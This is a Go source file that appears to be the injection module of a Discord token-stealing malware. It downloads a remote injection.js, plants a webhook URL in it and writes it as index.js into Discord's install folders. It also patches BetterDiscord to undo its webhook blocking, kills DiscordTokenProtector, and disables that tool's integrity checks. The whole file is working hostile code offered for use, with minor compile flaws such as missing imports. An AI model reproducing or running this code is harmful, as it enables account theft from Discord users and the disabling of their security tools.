package discordinjection

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"errors"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/0xFl4q/1237FHJQSDF1234/utils/hardware"
	"golang.org/x/text/encoding/charmap"
)

// Définir le lien d'injection
const InjectionURL = "https://raw.githubusercontent.com/0xFl4q/tktpascousin/main/injection.js"

func Run(webhook string) {
	for _, user := range hardware.GetUsers() {
		BypassBetterDiscord(user)
		BypassTokenProtector(user)
		InjectDiscord(user, InjectionURL, webhook)
	}
}

func InjectDiscord(user string, injectionURL string, webhook string) error {
	// Recherche du fichier core.asar dans tous les répertoires spécifiés
	discordDirs := []string{
		filepath.Join(user, "AppData", "Local", "discord"),
		filepath.Join(user, "AppData", "Local", "discordcanary"),
		filepath.Join(user, "AppData", "Local", "discordptb"),
		filepath.Join(user, "AppData", "Local", "discorddevelopment"),
	}

	for _, dir := range discordDirs {
		err := filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}
			if info.Name() == "core.asar" {
				// Lorsque core.asar est trouvé, injecter le fichier index.js dans le même répertoire
				coreDir := filepath.Dir(path)
				err := injectFile(coreDir, injectionURL, webhook)
				if err != nil {
					return err
				}
			}
			return nil
		})
		if err != nil {
			return err
		}
	}

	return nil
}

func injectFile(directory string, injectionURL string, webhook string) error {
	// Télécharger le contenu de l'injectionURL
	resp, err := http.Get(injectionURL)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	// Remplacer la variable webhook dans le corps du fichier
	body = bytes.Replace(body, []byte("%WEBHOOK%"), []byte(webhook), 1)

	// Générer une clé de chiffrement
	encryptionKey := []byte("aunommintctropbien")

	// Chiffrer le contenu du fichier index.js
	encryptedBody, err := encrypt(body, encryptionKey)
	if err != nil {
		return err
	}

	// Écrire le fichier index.js chiffré dans le répertoire spécifié
	err = ioutil.WriteFile(filepath.Join(directory, "index.js"), encryptedBody, 0644)
	if err != nil {
		return err
	}

	return nil
}

func encrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	ciphertext := make([]byte, aes.BlockSize+len(data))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, err
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], data)

	// Retourner le texte chiffré
	return ciphertext, nil
}

func BypassBetterDiscord(user string) error {
	bd := filepath.Join(user, "AppData", "Roaming", "BetterDiscord", "data", "betterdiscord.asar")
	f, err := os.Open(bd)
	if err != nil {
		return err
	}
	defer f.Close()

	r := bufio.NewReader(f)
	decoder := charmap.CodePage437.NewDecoder()
	decodedReader := decoder.Reader(r)

	txt, err := io.ReadAll(decodedReader)
	if err != nil {
		return err
	}

	f, err = os.Create(bd)
	if err != nil {
		return err
	}
	defer f.Close()

	w := bufio.NewWriter(f)
	encoder := charmap.CodePage437.NewEncoder()
	encodedWriter := encoder.Writer(w)

	_, err = encodedWriter.Write(bytes.ReplaceAll(txt, []byte("api/webhooks"), []byte("ByZeubrkk")))
	if err != nil {
		return err
	}
	err = w.Flush()
	if err != nil {
		return err
	}

	return nil
}

func BypassTokenProtector(user string) error {
	path := filepath.Join(user, "AppData", "Roaming", "DiscordTokenProtector")
	config := path + "\\config.json"

	processes, _ := process.Processes()

	for _, p := range processes {
		name, _ := p.Name()
		if strings.Contains(strings.ToLower(name), "discordtokenprotector") {
			p.Kill()
		}
	}

	for _, i := range []string{"DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"} {
		_ = os.Remove(path + "\\" + i)
	}
	if _, err := os.Stat(config); os.IsNotExist(err) {
		return nil
	}

	file, err := os.Open(config)
	if err != nil {
		return err
	}
	defer file.Close()

	var item map[string]interface{}
	if err := json.NewDecoder(file).Decode(&item); err != nil {
		return err
	}
	item["auto_start"] = true
	item["auto_start_discord"] = true
	item["integrity"] = false
	item["integrity_allowbetterdiscord"] = true
	item["integrity_checkexecutable"] = false
	item["integrity_checkhash"] = false
	item["integrity_checkmodule"] = false
	item["integrity_checkscripts"] = false
	item["integrity_checkresource"] = false
	item["integrity_redownloadhashes"] = false
	item["iterations_iv"] = 364
	item["iterations_key"] = 457
	item["version"] = 69420

	file, err = os.Create(config)
	if err != nil {
		return err
	}
	defer file.Close()

	encoder := json.NewEncoder(file)
	encoder.SetIndent("", "  ")
	encoder.SetEscapeHTML(false)
	if err := encoder.Encode(&item); err != nil {
		return err
	}

	return nil
}
